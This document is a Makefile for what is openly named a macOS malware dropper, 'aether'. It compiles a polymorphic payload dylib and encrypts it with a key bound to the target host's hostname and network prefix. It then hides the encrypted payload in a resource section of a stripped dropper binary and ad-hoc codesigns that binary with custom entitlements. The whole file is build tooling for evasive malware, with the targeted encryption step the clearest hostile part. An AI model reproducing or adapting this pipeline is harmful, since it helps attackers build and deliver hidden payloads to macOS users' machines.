GREEN := \033[0;32m
RED   := \033[0;31m
BLUE  := \033[0;34m
NC    := \033[0m

CC = cc
CXX = c++
CFLAGS = -std=c11 -O1 -Iasm/asm -Iasm/poly -Iasm/crypt -Ild -Irun -DNDEBUG -fvisibility=hidden
LDFLAGS = lib/libloader.a -framework Foundation -framework CoreServices -framework Security -framework IOKit -lobjc -lz
ENT = /tmp/aether.entitlements

UNAME_M := $(shell uname -m)
ifeq ($(UNAME_M),x86_64)
    ARCH_FLAG = -arch x86_64
else
    ARCH_FLAG = -arch arm64
endif

ASM_ARM = asm/asm/arm64.c
ASM_X86 = asm/asm/x86.c asm/asm/x86_classify.c
ASM_COMMON = asm/asm/macho.c

POLY_ARM = asm/poly/flow.c asm/poly/xfrm.c asm/poly/link.c \
           asm/poly/map.c
POLY_X86 = asm/poly/flow_x86.c asm/poly/xfrm_x86.c asm/poly/link_x86.c \
           asm/poly/map_x86.c asm/poly/ir_x86.c
POLY_COMMON = asm/poly/ir.c asm/poly/dec.c

CRYPT_SRC = asm/crypt/enc.c asm/crypt/bind.c
LOADER_SRC = ld/load.c ld/wrap.c
PAYLOAD_SRC = run/core.c run/chk.c run/sec.c
STUB_SRC = stub/run.c

ALL_ASM = $(ASM_ARM) $(ASM_X86) $(ASM_COMMON)
ALL_POLY = $(POLY_ARM) $(POLY_X86) $(POLY_COMMON)
ALL_SRC = $(ALL_ASM) $(ALL_POLY) $(CRYPT_SRC) $(LOADER_SRC) $(PAYLOAD_SRC) $(STUB_SRC)
ALL_OBJ = $(ALL_SRC:.c=.o)

all: lib/aether_dropper

lib/payload.dylib: $(ALL_OBJ)
	@echo "$(BLUE)[*]$(NC) Linking payload.dylib..."
	@$(CXX) -bundle -o $@ $^ $(LDFLAGS) -Wl,-exported_symbol,___8d3942b93e489c7a
	@codesign -f -s - $@ 2>/dev/null || true
	@echo "$(GREEN)[+]$(NC) payload.dylib built"

lib/aether_dropper: stub/init.o asm/crypt/enc.o lib/payload.enc
	@echo "$(BLUE)[*]$(NC) Linking dropper..."
	@echo "" | $(CC) -x c - -c -o /tmp/empty.o
	@ld -r $(ARCH_FLAG) /tmp/empty.o -o /tmp/payload_data.o -sectcreate __DATA __rsrc lib/payload.enc
	@$(CC) -o $@ stub/init.o asm/crypt/enc.o /tmp/payload_data.o -framework Foundation -framework CoreServices -framework Security -framework IOKit
	@rm /tmp/payload_data.o /tmp/empty.o
	@strip -x $@
	@codesign -f -s - --entitlements $(ENT) $@ 2>/dev/null || true
	@echo "$(GREEN)[+]$(NC) aether_dropper built"

lib/payload.enc: lib/payload.dylib tools/pack
	@echo "$(BLUE)[*]$(NC) Encrypting payload..."
	@HOSTNAME=$$(hostname); \
	NETWORK=$$(ifconfig | grep "inet " | awk '{print $$2}' | grep -v "^127\." | head -1 | cut -d. -f1-2).; \
	tools/pack lib/payload.dylib lib/payload.enc "$$HOSTNAME" "$$NETWORK" "/Library"
	@echo "$(GREEN)[+]$(NC) Payload encrypted"

tools/pack: tools/pack.c
	$(CC) -O2 -o $@ $^ -framework Security

stub/init.o: stub/init.c lib/payload.enc
	@if [ -f lib/payload.enc.profile ]; then \
		cat lib/payload.enc.profile > /tmp/dropper_profile.c; \
		$(CC) $(CFLAGS) -c stub/init.c -o stub/init.o -include /tmp/dropper_profile.c; \
	else \
		echo "ERROR: Profile not found"; exit 1; \
	fi

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@




clean:
	@echo "$(RED)[-]$(NC) Cleaning artifacts..."
	@rm -f $(ALL_OBJ) stub/boot.o stub/init.o asm/crypt/enc.o asm/crypt/bind.o
	@rm -f lib/aether_dropper lib/payload.dylib lib/payload.enc lib/payload.enc.profile tools/pack
	@find . -name "*.o" -type f -delete
	@rm -rf lib/*.dSYM
	@echo "$(GREEN)[+]$(NC) Clean"

.PHONY: all clean
